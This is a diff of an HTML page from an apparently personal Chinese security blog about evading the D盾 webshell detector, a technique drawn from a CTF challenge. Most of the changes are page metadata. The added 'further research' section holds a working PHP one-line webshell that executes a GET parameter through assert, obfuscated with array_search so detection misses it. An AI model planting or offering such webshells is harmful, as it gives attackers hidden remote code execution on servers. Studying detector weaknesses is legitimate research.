@@ -131,7 +131,8 @@
 <meta property="og:image" content="http://cuokon.github.com/image/%E8%BF%87D/4.png">
 <meta property="og:image" content="http://cuokon.github.com/image/%E8%BF%87D/5.png">
 <meta property="og:image" content="http://cuokon.github.com/image/%E8%BF%87D/6.png">
-<meta property="og:updated_time" content="2019-11-26T04:35:03.357Z">
+<meta property="og:image" content="http://cuokon.github.com/image/%E8%BF%87D/7.png">
+<meta property="og:updated_time" content="2019-11-28T13:36:44.930Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="过D">
 <meta name="twitter:description" content="引言在打nctf的时候,由一道ctf题目引发的过D盾的思路,主要思路用的是一个比较偏的函数get_defined_functions 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数  这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&amp;lt;?php">
@@ -433,13 +434,23 @@
                 
               
 
-              <time title="创建时间：2019-11-26 12:31:49 / 修改时间：12:35:03" itemprop="dateCreated datePublished" datetime="2019-11-26T12:31:49+08:00">2019-11-26</time>
+              <time title="创建时间：2019-11-26 12:31:49" itemprop="dateCreated datePublished" datetime="2019-11-26T12:31:49+08:00">2019-11-26</time>
             </span>
           
 
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-11-28 21:36:44" itemprop="dateModified" datetime="2019-11-28T21:36:44+08:00">2019-11-28</time>
+              </span>
             
           
 
@@ -485,7 +496,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">545</span>
+              <span title="本文字数">743</span>
             </span>
           
 
@@ -533,6 +544,10 @@
 
 <p><img src="../../../../image/%E8%BF%87D/5.png" alt></p>
 <p><img src="../../../../image/%E8%BF%87D/6.png" alt></p>
+<h2 id="深入研究"><a href="#深入研究" class="headerlink" title="深入研究"></a>深入研究</h2><p>其实主要原因是并不是因为get_defined_functions是偏僻函数,而是因为D盾对函数检测的返回值没有特别严格,例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">0</span>]=<span class="string">'assert'</span>;</span><br><span class="line">$a[array_search(<span class="string">'assert'</span>,$a)]($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/%E8%BF%87D/7.png" alt><br>还有就是我在星球分享绕过D盾的思路那篇文章,也是利用函数返回值绕过D盾的。<br>所以我们可以多利用函数的返回值进行绕过。</p>
 
       
     </div>
@@ -857,7 +872,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过D"><span class="nav-number">2.</span> <span class="nav-text">过D</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过D"><span class="nav-number">2.</span> <span class="nav-text">过D</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#深入研究"><span class="nav-number">3.</span> <span class="nav-text">深入研究</span></a></li></ol></div>
             
 
           </div>
@@ -899,7 +914,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">25 分钟</span>
+    <span title="站点阅读时长">26 分钟</span>
   
 </div>
 
